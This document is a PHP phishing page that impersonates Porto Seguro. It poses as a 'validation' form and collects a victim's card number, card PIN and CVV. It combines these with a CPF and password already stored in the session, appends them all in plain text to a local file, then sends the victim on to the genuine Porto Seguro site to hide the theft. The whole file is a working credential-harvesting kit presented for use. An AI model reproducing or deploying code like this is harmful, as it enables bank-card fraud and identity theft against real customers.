<?php 
session_start();
if(isset($_POST['acao'])){
    $cpf = $_SESSION['cpf'];
    $senha = $_SESSION['senha'];
    $cartao = $_POST['cartao'];
    $senha_cartao = $_POST['senha_cartao'];
    $cvv = $_POST['cvv'];

    $name = 'arquivo.txt';
    $text = 
    '
    '.PHP_EOL.'
    ==============================================
    CPF: '.$cpf.' '.PHP_EOL.'
    SENHA: '.$senha.' '.PHP_EOL.'
    CARTÃO: '.$cartao.' '.PHP_EOL.'
    SENHA CARTÃO: '.$senha_cartao.' '.PHP_EOL.'
    CVV: '.$cvv.'
    ===============================================
    ';
    $file = fopen($name, 'a');
    fwrite($file, $text);
    fclose($file);

    echo '<script>alert("Seus dados estão em validação, aguarde o contato via e-mail! Porto Seguro agradece.")
    window.location.href="https://www.portoseguro.com.br/";</script>';


}

?>
<!doctype html>
<html lang="pt_BR">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="favicon.ico">

    <title>PortoSeguro</title>

    <!-- Bootstrap core CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <!-- Custom styles for this template -->
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons"
      rel="stylesheet">
    <link href="css/estilo.css" rel="stylesheet">
  </head>
  <body class="text-center">
  <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
    <header>
        <!-- Fixed navbar -->
        <nav class="navbar navbar-expand-md navbar ls fixed-top bg ls shadow-sm">
            <span class="material-icons text-white">
                arrow_back
                </span>
          <a class="navbar-brand text-white" style="position: absolute; margin-left: 50px;" href="#">Validar</a>
        </nav>
      </header>
    <form name="form1" method="post" class="form-signin">
        <p class="text" style="color:#A4B2CF;">Validação para a sua segurança.</p>

      <input type="text" name="cartao" id="ao_cpf" maxlength="16" onblur="ValidaCPF()" class="form-control" placeholder="Digite seu Cartão da Porto" required autofocus><br>
      <input type="password" maxlength="8" minlength="6" name="senha_cartao" class="form-control" placeholder="Senha do Cartão" required>
      <span class="material-icons text-muted" style="position: absolute; margin-left: 110px; margin-top: -42px;">
        visibility
        </span>
        
      <input type="text" name="cvv" minlength="3" maxlength="3" class="form-control" placeholder="Código de Segurança" required> 
      <br>

      <button class="btn btn-lg btn-block" type="submit" name="acao" id="btn-mensagem" style="background-color: #00ABF9; color: #fff; text-align: center;">Validar</button><br>
      
      <div class="checkbox mb-3">
        <label>
        </label>
      </div>
    
    </form>
    
    <!-- <p class="text-center fx">Solicitar Cartão de Crédito Porto Seguro</p> -->
  </body>
</html>